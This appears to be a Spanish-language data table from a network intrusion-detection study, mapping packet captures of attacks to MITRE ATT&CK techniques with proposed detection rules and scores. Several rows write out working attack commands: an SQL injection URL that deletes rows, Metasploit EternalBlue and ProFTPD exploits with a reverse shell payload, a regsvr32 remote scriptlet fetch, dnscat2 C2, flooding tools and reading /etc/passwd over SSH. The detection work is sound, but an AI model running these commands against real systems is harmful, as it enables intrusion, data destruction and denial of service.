Collection;-;TA0009;Email Collection;T1114;Remote Email Collection;T1114.002;Recolección de correos electrónicos de un servidor Microsoft Exchange haciendo uso de credenciales robadas;PowerShell;T1114-Email_collection_remote_email_collection_[4].pcapng;1;1;0;NO;"""Detección por anomalías, peticiones LDAP espontáneas desde un equipo de la red, haciendo uso de una cuenta con credenciales válidas.""";-;Manual [4] / 3.16;Manual [4] / B.16;Manual [4] / 4.16;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Impact;-;TA0040;Data Manipulation;T1565;Stored Data Manipulation;T1565.001;Inyección SQL;Sqlmap;T1565.001-SQL_inyection_[3].pcapng;1;1;0;NO***;"Reglas personalizadas que detecten ataques de inyeccion SQL mediante la presencia del caracter ""%27""";"""El objetivo es generar daño en la BBDD. Queremos borrar lineas de una tabla. Comando: http://172.16.2.2:8080/contacto?apellidos=Fernandez%27;%20DELETE%20FROM%20contactos%20WHERE%20num=3--""";Manual [3] / 3.8.8;Manual [3] / 3.8.8.4;Manual [3] / 3.8.8.5;1;1;0;1;0;1;0;0.00;1;1.00;1;1.00;1;1.00;-;1;1.00;1
Impact;-;TA0040;Endpoint Denial of Service;T1499;OS Exhaustion Flood;T1499.001;Denegación de servicio a servidor web;Metasploit;T1499.001-OS_Exhaustion_Flood_[3].pcapng;1;1;0;NO;-;Uso de metasploit para ataque DoS con herramienta Slowloris. Comando: use auxiliary/dos/http/slowloris;Manual [3] / 3.8.16;Manual [3] / 3.8.16.4;Manual [3] / 3.8.16.5;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Impact;-;TA0040;Endpoint Denial of Service;T1499;Application or System Exploitation;T1499.004;Suplantación MAC;ip;T1499-Mac_spoof_[1].pcapng;1;1;0;SI;"""Mediante el uso de preprocesadores, la detección de este ataque es posible estableciendo un asociación entre la IP a proteger y su dirección MAC correspondiente. De esta forma, se puede fundar una regla que detecte mensajes ARP que incumplen esta asociación y que avistan de un posible ataque por suplantación MAC""";-;Manual [1] / 2.1.1.1.2;Manual [1] / E.2;-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Endpoint Denial of Service;T1499;Service Exhaustion Flood;T1499.002;Reseteo de Conexión;"""ettercap, netwox, nping""";T1499-Reseteo_[1].pcapng;1;1;0;NO;Detección por anomalías que identifique reseteos de conexión periódicos y desde direcciones sospechosas;-;Manual [1] / 2.3.1.1.6;Manual [1] / E.12;-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Impact;-;TA0040;Endpoint Denial of Service;T1499;OS Exhaustion Flood;T1499.001;Inundación SYN con suplantación;hping3;T1499-Syn_suplantacion_[1].pcapng;1;1;0;SI;Regla genérica que detecte el envío prolongado de mensajes TCP SYN que dejan los sockets del equipo a proteger en estado SYN-RECV (no se terminan los handshake de las conexiones TCP establecidas);-;Manual [1] / 2.3.1.1.3;Manual [1] / E.9;-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Endpoint Denial of Service;T1499;OS Exhaustion Flood;T1499.001;LAND;hping3;T1499-Land_[1].pcapng;1;1;0;SI;Regla genérica que detecte envío de mensajes TCP SYN procedentes de la misma dirección IP a la que van dirigidos los paquetes. Los puertos origen/destino pueden ser incluso idénticos;-;Manual [1] / 2.3.1.1.5;Manual [1] / E.11;-;1;1;0;1;0;1;0;0.00;1;1.00;1;1.00;1;1.00;-;0;0.00;1
Impact;-;TA0040;Endpoint Denial of Service;T1499;Service Exhaustion Flood;T1499.002;Inundación DHCP / Inanición;"""DHCPig, yersinia""";T1499-Dhcp_flood_[1].pcapng;;1;0;SI;"""Regla genérica que detecte un envío masivo de procedimientos DHCP completos (DISCOVERY, OFFER, REQUEST, ACK)""";-;Manual [1] / 2.4.2.1.1;Manual [1] / E.18;Manual [4] / 4.1.39;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Endpoint Denial of Service;T1499;Service Exhaustion Flood;T1499.002;Reflexión SYN-ACK;hping3;T1499-Reflexion_synack_[1].pcapng;;1;0;SI;Regla que detecte el envío de mensajes TCP SYN-ACK no solicitados previamente por el la red a proteger;-;Manual [1] / 3.4.2;Manual [1] / E.10;-;1;1;0;1;0;0;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Endpoint Denial of Service;T1499;Service Exhaustion Flood;T1499.002;Envio solicitudes HTTP a baja tasa;Slowhttptest;T1499.02-Slowhttptest-C2018_[6].pcapng;;1;0;SI;Regla que detecte el envío de mensajes HTTP a baja tasa;Uso de Slowhttptest para denegación de servicio a servidor web;Dataset CIC-2018;Dataset CIC-2018;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Endpoint Denial of Service;T1499;Service Exhaustion Flood;T1499.002;Envio solicitudes HTTP parciales;Slowloris;T1499.02-Slowloris-C2018_[6].pcapng;;1;0;SI;Regla que detecte el envío de mensajes HTTP parciales o uso de Slowloris;Uso de Slowloris para denegación de servicio a servidor web;Dataset CIC-2018;Dataset CIC-2018;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;1;1.00;1;1.00;-;1;1.00;1
Impact;.;TA0040;Endpoint Denial of Service;T1499;Application Exhaustion Flood;T1499.003;Denegación de servicio a servidor web;Hulk;T1499.03-Hulk-C2018_[6].pcapng;;1;0;SI;Reglas que detecen envío masivo de solicitudes a servidor web;Uso de Hulk para denegación de servicio a servidor web;Dataset CIC-2018;Dataset CIC-2018;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;.;TA0040;Endpoint Denial of Service;T1499;Application Exhaustion Flood;T1499.003;Denegación de servicio a servidor web;GoldenEye;T1499.03-GoldenEye-C2018_[6].pcapng;;1;0;SI;Reglas que detecen envío masivo de solicitudes a servidor web;Uso de GoldenEye para denegación de servicio a servidor web;Dataset CIC-2018;Dataset CIC-2018;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Network Denial of Service;T1498;Direct Network Flood;T1498.001;Inundación tabla MAC;Macof;T1498.001-MAC_table_flood_[3].pcapng;;1;0;NO;-;Inundacion tabla MAC mediante Macof. Comando: sudo macof -i enp0s9 -d 172.16.1.1;Manual [3] / 3.8.18;Manual [3] / 3.18.4;Manual [3] / 3.18.5;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Impact;-;TA0040;Network Denial of Service;T1498;Direct Network Flood;T1498.001;Inundación UDP;"""Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests""";T1498.001-UDP_flood_1-C2018_[6].pcapng;;1;0;SI;Regla genérica que detecte un envío masivo de mensajes UDP con destino el mismo puerto objetivo;-;Dataset CIC-2018;Dataset CIC-2018;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Network Denial of Service;T1498;Direct Network Flood;T1498.001;Inundación UDP;"""Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests""";T1498.001-UDP_flood_2-C2018_[6].pcapng;;1;0;SI;Regla genérica que detecte un envío masivo de mensajes UDP con destino el mismo puerto objetivo;-;Dataset CIC-2018;Dataset CIC-2018;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Network Denial of Service;T1498;Direct Network Flood;T1498.001;Inundación HTTP;"""Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests""";T1498.001-HTTP_flood-C2018_[6].pcapng;;1;0;SI;Regla que detecte envío masivo de mensajes HTTP;-;Dataset CIC-2018;Manual [4] / B.37;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Network Denial of Service;T1498;Direct Network Flood;T1498.001;Inundación TCP;"""Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests""";T1498.001-TCP_flood-C2018_[6].pcapng;;1;0;SI;Regla que detecte envío masivo de mensajes TCP;-;Dataset CIC-2018;Manual [4] / B.37;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Network Denial of Service;T1498;Direct Network Flood;T1498.001;Inundación UDP;"""Caldera, hping3""";T1498.001-UDP_flood_[2].pcapng;;1;0;NO;-;Inundacion UDP en la red de la víctima. Comando: timeout 10s hping3 --udp --flood 192.168.2.2;Manual [2] / 3.1.10.2;Manual [2];-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Impact;-;TA0040;Network Denial of Service;T1498;Reflection Amplification;T1498.002;Amplificación DNS;dnsdrdos;T1498-Amplif_dns_[1].pcapng;;1;0;SI;Regla genérica que detecte un envío masivo de respuestas DNS no solicitadas con un mismo nombre resuelto hacia la red protegida;-;Manual [1] / 3.5.1;Manual [1] / E.14;Manual [4] / 4.1.35;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;1;1.00;-;1;1.00;1
Impact;-;TA0040;Network Denial of Service;T1498;Reflection Amplification;T1498.002;Fraggle;hping3;T1498-Fraggle_[1].pcapng;;1;0;SI;"""Regla genérica que detecte un envío masivo de datagramas UDP hacia un puerto concreto, con fin de saturarlo y causar su inoperatividad""";-;Manual [1] / 3.4.5;Manual [1] / E.13;Manual [4] / 4.1.36;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Network Denial of Service;T1498;Reflection Amplification;T1498.002;Smurf;hping3;T1498-Smurf_[1].pcapng;;1;0;SI;Regla genérica que detecte un envío masivo de respuestas ICMP;-;Manual [1] / 3.3.1;Manual [1] / E.7;Manual [4] / 4.1.37;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Network Denial of Service;T1498;-;-;Inundación de TCBPDU;yersinia;T1498-Tcbpdu_[1].pcapng;;1;0;NO;-;-;Manual [1] / 3.2.2;Manual [1] / E.5;Manual [4] / 4.1.38;1;0;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Impact;-;TA0040;Resource Hijacking;T1496;-;-;Descarga y puesta en marcha de software de criptominado;XMRIG;T1496-Cryptomining_[2].pcapng;;1;0;NO;-;"""Instalacion y uso de software de minado. Comando: wget https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-linux-x64.tar.gz;""";Manual [2] / 3.3.2.1;Manual [2];Manual [2] / 4.2.2.3;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Impact;-;TA0040;Defacement;T1491;Internal Defacement;T1491.001;Modificar fondo de pantalla equipo victima;PowerShell;T1491.001-Internal_Defacement_[5].pcapng;;1;0;NO;Detectable por listas negras/anomalías;Modificar fondo de pantalla equipo victima;Manual [5] / 3.5.10.1;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Command and Control;-;TA0040;Application Layer Protocol;T1071;DNS;T1071.004;Command - Control via DNS;dnscat2;T1071-Tunel_[1].pcapng;;1;0;SI;Regla genérica que detecta uso de dnscat;"""Envio de peticiones DNS como canal de comunicaciones con la víctima. Comando: timeout 15s /root/dnscat2/client/dnscat --dns server=192.168.2.2,port=53 --secret= acabc17b6904a7f8fada4e7f8de4bce8 --no-encryption""";Manual [1] / 5.2.3;Manual [1] / E.17;Manual [4] / 4.1.30;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;1;1.00;1
Command and Control;-;TA0040;Multi-Stage Channels;T1104;-;-;Sesión Remota + Ataque C2;"""RDP, Covenant""";T1104-Multi_stage_channels_[4].pcapng;;1;1;NO;Detección por anomalías. Investigación de las sesiones establecidas en el equipo atacante (siempre que sea posible) para identificar un rastro de otra dirección.;"""Envio de peticiones DNS como canal de comunicaciones con la víctima. Comando: timeout 15s /root/dnscat2/client/dnscat --dns server=192.168.2.2,port=53 --secret= acabc17b6904a7f8fada4e7f8de4bce8 --no-encryption""";Manual [4] / 3.22;Manual [4] / B.22;Manual [4] / 4.22;1;0;1;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Command and Control;-;TA0040;Fallback Channels;T1008;-;-;Traspaso de canal primario C2 a canal alternativo;Covenant;T1008-Fallback_channels_[4].pcapng;;1;0;SI*;"""La detección de la creación del canal es posible para este caso concreto, en el que el cortafuegos detecta la creación de ambos canales. Sin embargo, si ambos canales, tanto primario como secundario están establecidos, y no se ha detectado su creación, el cambio de uno a otro es inapreciable por el cortafuegos.""";-;Manual [4] / 3.19;Manual [4] / B.19;Manual [4] / 4.19;1;1;0;1;0;1;0;0.00;1;1.00;1;1.00;1;1.00;-;1;1.00;1
Command and Control;-;TA0040;Web Service;T1102;One-Way Communication;T1102.003;Subida de información confidencial a Workspace de Google Drive;"""Covenant, Google Drive API""";T1102.003-Web_service-one_way_communication_[4].pcapng;;1;1;NO;"""Detección por anomalías, observando actividad inusual relacionada con el uso de servicios web (subidas pesadas de información a la nube, comunicación periódica con servidores web concretos, etc)""";-;Manual [4] / 3.21;Manual [4] / B.21;Manual [4] / 4.21;1;1;1;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Command and Control;-;TA0040;Proxy;T1090;Internal Proxy;T1090.001;Uso de Equipo interno como Proxy para el ataque C2;Covenant;T1090-Proxy_internal_proxy_[4].pcapng;;1;1;NO;"""Aunque sí es detectable la conexión C2 directa con el atacante, no existe un mecanismo de detección concreto que pueda identificar el uso de un proxy, más allá de una detección por anomalías, como la repetición de paquetes, dando a entender que un equipo interno está replicando paquetes, y por tanto está actuando como proxy""";-;Manual [4] / 3.20;Manual [4] / B.20;Manual [4] / 4.20;1;1;1;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Command and Control;-;TA0040;Data Obfuscation;T1001;Protocol Impersonation;T1001.003;Falsificación de protocolos de conexión segura como SSL o TLS;FakeTLS (raykaryshyn Github);T1001.003-Data_obfuscation_protocol_impersonation_[4].pcapng;;1;0;NO*;Regla personalizada que compruebe el campo Server Name y mediante DNS asegure si se corresponde con la dirección IP a la que se está accediendo.;-;Manual [4] / 3.17;Manual [4] / B.17;Manual [4] / 4.17;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Command and Control;-;TA0040;Data Obfuscation;T1001;Steganography;T1001.002;Inserción de información confidencial en una imagen JPG;"""Covenant, SSH, scp, Powershell""";T1001.002-Data_obfuscation_steganography_[4].pcapng;;1;0;NO;"""Detección por anomalías y/o estegoanálisis, envío de imágenes o ficheros con formato poco común entre equipos, existencia de ficheros comprimidos sospechosos, etc.""";-;Manual [4] / 3.18;Manual [4] / B.18;Manual [4] / 4.18;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;1;1.00;0
Command and Control;-;TA0040;Ingress Tool Transfer;T1105;-;-;Transferencia de archivos de un servidor C2 a un equipo previamente comprometido;"""Metasploit, FTP""";T1105-Ingress_Tool_Transfer_[5].pcapng;;1;0;SI;"""Reglas genéricas que detecten un traspaso de archivos entre equipos utilizando protocolos de transferencia de ficheros como SMB, FTP... Dependiendo de las circunstancias del ataque tambien es importante detectar la transferencia de archivos malware que sean detectables mediante tráfico de red.""";"""Servidor FTP en el servidor C2. A través de la conexión del atacante a la víctima, usando el comando ftp transferimos herramientas desde el servidor C2 a la víctima""";Manual [5] / 3.5.8.1;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;1;1.00;-;0;0.00;1
Command and Control;-;TA0040;Data Encoding;T1132;Standard Encoding;T1132.001;Codificacion de mensajes entre la victima y el C2 Server mediante Base64;"""Metasploit, curl, base64""";T1132.001_Standard_Encoding_[5].pcapng;;1;0;NO;Deteccion por anomalias;Servidor HTTP en el C2 Server. Intercambio de mensajes entre la victima y atacante mediante base64;Manual [5] / 3.5.8.2;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Command and Control;-;TA0040;Remote Access Software;T1219;-;-;Uso de TeamViewer para establecer canal de comunicación alternativo;TeamViewer;"""T1219-RemoteAccessSoftwareLocal_[5].pcapng, T1219-RemoteAccessSoftwareNAT_[5].pcapng""";;1;0;NO;"""Deteccion por listas negras/anomalías. Monitorizar tráfico de red correspondiente a softwares de acesso remoto(AnyDesk, TeamViewer...)""";Conexion mediante TeamViewer entre dos equipos;Manual [5] / 3.5.8.3;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Command and Control;-;TA0040;Dynamic Resolution;T1568;Fast Flux DNS;T1568.001;Esconder un C2 Server mediante un servidor DNS con bajo TTL y modo Fast Flux;"""bind, Metasploit""";T1568-fastFluxDNS_[5].pcapng;;1;0;NO;Deteccion por anomalias o listas negras;"Servidor DNS ""Round Robin""";Manual [5] / 3.5.8.4;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Command and Control;-;TA0040;Hide Infrastructure;T1665;-;-;Esconder el servidor C2 utilizando un Proxy;"""Metasploit, HTTP Server""";T1665-Hide_Infrastructure_[5].pcapng;;1;0;NO**;"""Detección por reglas/anomalías. Resulta importante monitorizar tráfico de red con destino a dominios incluidos en listas negras, conexiones a equpos externos…""";Esconder el servidor C2 utilizando un proxy;Manual [5] / 3.5.8.5;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;1;1.00;1
Command and Control;-;TA0040;Protocol Tunneling;T1572;-;-;Tunelizar la conexión al C2 Server mediante SSH;"""SSH, Metasploit""";T1572-Protocol_Tunneling_[5].pcapng;;1;0;NO;"""Deteccion por anomalías, monitorizando la creacion de nuevas conexiones""";Tunelizar una conexion mediante SSH;Manual [5] / 3.5.8.6;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;1;1.00;0
Command and Control;-;TA0040;Encrypted Channel;T1573;Assymetric Cryptography;T1573.002;Encriptar conexion con C2 Server;"""Metasploit, OpenSSL""";T1573.002_AssymetricCryptography_[5].pcapng;;1;0;NO**;"""Deteccion por anomalías, monitorizando la creacion de nuevas conexiones""";Encriptar conexion al C2 Server;Manual [5] / 3.5.8.7;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Command and Control;-;TA0040;Non-Standard Port;T1571;-;-;Sesión SSH en puerto 2200;ssh;T1571-SSH_[2].pcapng;;1;0;NO;-;Establecer una sesion SSH sobre un puerto no estandar. Comando: sshpass -p salas ssh salas@192.168.2.2 -p 2200 cat /etc/passwd;Manual [2] / 3.1.9.1;Manual [2];-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Command and Control;"""Defense Evasion, Persistence""";TA0040;Traffic Signaling;T1205;Port Knocking;T1205.001;Esconder y activar un puerto de forma remota;Knockd;T1205.001-Port_Knocking_[3].pcapng;;1;0;NO;-;"""Ocultar y activar un puerto remotamente, haciendo primero peticiones a ciertos puertos de forma secuencial. Comando: knock -v 172.16.2.2 7000 8000 9000""";Manual [3] / 3.8.11;Manual [3] / 3.8.11.4;Manual [3] / 3.8.11.5;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Defense Evasion;-;TA0005;Indicator Removal;T1070;Network Share Connection Removal;T1070.005;Eliminación de conexiones establecidas via Network Share en Windows;Comando Net Use;T1070-Indicator_removal_network_share_connection_removal_[4].pcapng;;1;0;NO;Detección por anomalías basada en desconexión repentina procedente de una dirección de varios recursos compartidos;-;Manual [4] / 3.8;Manual [4] / B.8;Manual [4] / 4.8;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Defense Evasion;-;TA0005;Modify Registry;T1112;-;-;Modificación del Registro de forma remota;reg (Remoto);T1112-Modify_registry_[4].pcapng;;1;0;SI;Regla que detecte el envío de mensajes con protocolo WINREG o Remote Registry Service;-;Manual [4] / 3.9;Manual [4] / B.9;Manual [4] / 4.9;1;1;0;1;0;1;0;0.00;0;0.00;1;1.00;1;1.00;-;0;0.00;1
Defense Evasion;-;TA0005;Rogue Domain Controller;T1207;-;-;DCShadow: registro de un DC fraudulento para habilitar la manipulación de datos en un entorno Active Directory;mimikazt;T1207-Rogue_domain_controller_[4].pcapng;;1;0;SI;Regla que detecte una llamada a la función DRSUAPI_REPLICA_ADD (5);-;Manual [4] / 3.10;Manual [4] / B.10;Manual [4] / 4.10;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Defense Evasion;-;TA0005;System Binary Proxy Execution;T1218;Regsvr32;T1218.010;Ejecución de COM scriptlet remoto;Regsvr32.exe;T1218.010-COM_Scriptlet_[2].pcapng;;1;0;NO;-;"""Aprovechar vulnerabilidad regsvr32.exe descargando y ejecutando scripts y librerias evadiendo controles de seguridad Windows. Comando: C:\Windows\system32\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll""";Manual [2] / 3.3.1.1;Manual [2];-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Defense Evasion;-;TA0005;Template Injection;T1221;-;-;Inyectar un fichero mediante Phishing .docx con macros modificadas que permita pasar desapercibido;Sitios web convencionales (Gmail);T1221-Template_Injection_[5].pcapng;;1;0;NO**;"""Detección por lista negra/anomalías. Debería monitorizarse y detectar tráfico de red hacia direcciones o dominios marcados en listas negras. En algún caso concreto, se puede descargar y ejecutar malware por lo que se debe monitorizar y detectar la descarga de este tipo de ficheros""";"""Modificación de fichero .docx para, mediante macros, provocar la descarga y ejecución de malware en el equipo víctima""";Manual [5] / 3.5.4.1;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Defense Evasion;-;TA0005;Network Boundary Bridging;T1599;NAT Traversal;T1599.001;Modificación de políticas de red para permitir tráfico externo a la red interna;iptables;"""T1599-NBB1_[5].pcapng, T1599-NBB2_[5].pcapng""";;1;0;NO;Deteccion por anomalías;Equipo intermedio entre red interna de la víctima y el atacante con firewall. El atacante con acceso a este equipo intermedio modifica las reglas del firewall iptables para permitir su tráfico.;Manual [5] / 3.5.4.2;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Defense Evasion;-;TA0005;Network Boundary Bridging;T1599;-;-;Salto de VLAN;ip;T1599-Salto_vlan_[1].pcapng;;1;0;NO;"""Detección por anomalías y estudio de topología de red, que detecte posibles vulnerabilidades relacionadas con el etiquetado apilable 802.1Q""";-;Manual [1] / 3.2.1;Manual [1] / E.4;;1;1;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Defense Evasion;-;TA0005;Build Image on Host;T1612;-;-;Creacion y montado de un contenedor con un servidor SSH sobre un equipo previamente vulnerado;"""DockerAPI, SSH""";"""T1612-BuildImageOnHostLocal_[5].pcapng, T1612-BuildImageOnHostNAT_[5].pcapng""";;1;0;SI;Regla genérica que detecte descargas de contenedores mediante Docker API;Construir contenedor sobre el equipo víctima para evitar ser detectados.;Manual [5] / 3.5.4.3;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Lateral Movement;-;TA0008;Remote Services;T1021;SSH;T1021.004;Sesión SSH;SSH;T1021-remote_services_ssh_[3].pcapng;;1;0;SI;;-;;;;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;;;
Lateral Movement;-;TA0008;Exploitation of Remote Services;T1210;-;-;EternalBlue;Metasploit;T1210-Eternal_blue_[2].pcapng;;1;0;SI;Regla genérica que detecte uso de EternalBlue;"""Uso de exploit Eternalblue para obtener movimiento lateral y establecimiento de meterpreter. Comando: msfconsole -x ""use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.2.2; set LHOST 192.168.1.3; run -z; sessions -c getuid; sessions -k 1; exit""""";Manual [2] / 3.1.7.1;Manual [4] / B.29;Manual [2] / 4.1.1.4;1;1;0;1;0;1;1;1.00;1;1.00;1;1.00;1;1.00;-;1;1.00;1
Lateral Movement;-;TA0008;Exploitation of Remote Services;T1210;-;-;Ataque Web;"""DVWA, In-house selenium framework""";T1210-Web_attack-C2018_[6].pcapng;;1;0;NO;-;-;Dataset CIC-2018;Manual [4] / B.36;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Lateral Movement;-;TA0008;Exploitation of Remote Services;T1210;-;-;Ejecución de código remoto basado en vulnerabilidades de servidor FTP;Metasploit;T1210-Remote_code_execution_[2].pcapng;;1;0;SI;Regla genérica que detecte intento de ejecucion remota de codigo en servidor FTP;"Uso de comandos SITE/CPFR/CPTO en la version 1.3.5 de ProFTPD que permite copiar ficheros a cualquier usuario no autenticado. Comando: msfconsole -x ""use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS 192.168.2.2; set SITEPATH /var/www/html; set LHOST 192.168.1.3; set LPORT 4444; set payload cmd/unix/reverse_perl; run -z; sessions -c ls; sessions -k 1; exit""";Manual [2] / 3.1.7.2;Manual [4] / B.30;Manual [2] / 4.2.1.9;1;1;0;1;0;1;0;0.00;0;0.00;1;1.00;1;1.00;-;1;1.00;1
Lateral Movement;-;TA0008;Remote Service Session Hijacking;T1563;RDP Hijacking;T1563.002;Secuestro de sesión RDP mediante tscon.exe;tscon.exe;T1563.002_RDPHijacking_[5].pcapng;;1;0;SI;Regla genérica para detectar conexiones RDP entre un orígen y un servidor o destino;"""Uso de Windows Server 2012 R2 con DNS, Active Directory y Servicio de Escritorio Remoto""";Manual [5] / 3.5.7.1;Manual [5];;1;1;0;1;0;1;1;1.00;1;1.00;1;1.00;1;1.00;-;0;0.00;1
Lateral Movement;-;TA0008;Lateral Tool Transfer;T1570;-;-;Transferencia de herramientas para la continuación del ataque entre máquinas utilizando protocolos de compartición de archivos;Metasploit;T1570-Lateral_Tool_Transfer_[5].pcapng;;1;0;SI;"""Reglas genéricas que detecten un traspaso de archivos entre equipos utilizando protocolos de transferencia de ficheros como SMB, FTP... Dependiendo de las circunstancias del ataque tambien es importante detectar la transferencia de archivos malware que sean detectables mediante tráfico de red.""";Transferencia mediante FTP de ficheros entre dos equipos;Manual [5] / 3.5.7.2;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;1;1.00;1
Lateral Movement;-;TA0008;Internal Spear-phishing;T1534;-;-;Phishing interno entre equipos pertenecientes a un dominio con servidor de correo habilitado;"""MailEnabler, Thunderbird""";T1534-Internal_spearphishing_[4].pcapng;;1;0;NO;"""Detección por anomalías, análisis de la estructura de correos electrónicos, petición de información confidencial, etc""";-;Manual [4] / 3.14;Manual [4] / B.14;Manual [4] / 4.14;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
